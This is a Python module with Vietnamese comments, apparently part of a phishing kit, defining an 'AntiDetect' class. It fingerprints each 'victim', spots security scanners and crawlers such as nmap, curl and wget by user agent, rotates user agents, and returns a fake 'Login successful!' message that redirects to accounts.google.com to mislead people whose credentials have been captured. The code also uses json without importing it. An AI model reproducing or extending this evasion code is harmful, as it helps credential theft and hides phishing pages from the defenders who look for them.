#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import time
import hashlib
import re
from datetime import datetime
from typing import Dict, Tuple
from flask import request, jsonify
import logging

logger = logging.getLogger(__name__)

class AntiDetect:
    """Lớp chống phát hiện - xóa dấu vết"""
    
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        ]
        
        self.proxy_list = []
        self.fingerprints = {}
    
    def random_user_agent(self) -> str:
        """Tạo User-Agent ngẫu nhiên"""
        return random.choice(self.user_agents)
    
    def detect_bot(self, user_agent: str, ip: str) -> bool:
        """Phát hiện bot/crawler"""
        bot_patterns = [
            'bot', 'crawler', 'spider', 'scanner', 'nmap', 
            'python-requests', 'curl', 'wget', 'httpie'
        ]
        
        ua_lower = user_agent.lower()
        for pattern in bot_patterns:
            if pattern in ua_lower:
                logger.warning(f"🤖 Bot detected: {user_agent} from {ip}")
                return True
        return False
    
    def generate_fingerprint(self, request_data: dict) -> str:
        """Tạo fingerprint duy nhất cho mỗi nạn nhân"""
        data = {
            'ip': request_data.get('ip', ''),
            'user_agent': request_data.get('user_agent', ''),
            'accept_language': request_data.get('accept_language', ''),
            'timestamp': str(int(time.time() / 3600))  # Thay đổi theo giờ
        }
        
        # Tạo hash fingerprint
        fingerprint_str = json.dumps(data, sort_keys=True)
        return hashlib.sha256(fingerprint_str.encode()).hexdigest()[:16]
    
    def is_suspicious(self, request_data: dict) -> Tuple[bool, str]:
        """Kiểm tra request có đáng ngờ không"""
        suspicious = False
        reason = ""
        
        # Kiểm tra tốc độ request
        ip = request_data.get('ip', '')
        current_time = time.time()
        
        if ip in self.fingerprints:
            last_time = self.fingerprints[ip].get('last_request', 0)
            if current_time - last_time < 0.5:  # Quá nhanh
                suspicious = True
                reason = "Too fast"
        
        # Cập nhật time
        self.fingerprints[ip] = {
            'last_request': current_time,
            'count': self.fingerprints.get(ip, {}).get('count', 0) + 1
        }
        
        return suspicious, reason
    
    def sanitize_input(self, data: str) -> str:
        """Làm sạch input - chống XSS và injection"""
        # Loại bỏ HTML tags
        data = re.sub(r'<[^>]+>', '', data)
        # Loại bỏ script
        data = re.sub(r'javascript:', '', data, flags=re.IGNORECASE)
        # Giới hạn độ dài
        if len(data) > 1000:
            data = data[:1000]
        return data.strip()
    
    def fake_response(self) -> dict:
        """Trả về response giả để đánh lừa"""
        return {
            'status': 'success',
            'message': 'Đăng nhập thành công!',
            'redirect': 'https://accounts.google.com/',
            'delay': random.uniform(1, 3)
        }
    
    def log_suspicious_activity(self, ip: str, reason: str):
        """Ghi lại hoạt động đáng ngờ"""
        logger.warning(f"⚠️ Suspicious from {ip}: {reason}")

# Singleton
anti_detect = AntiDetect()
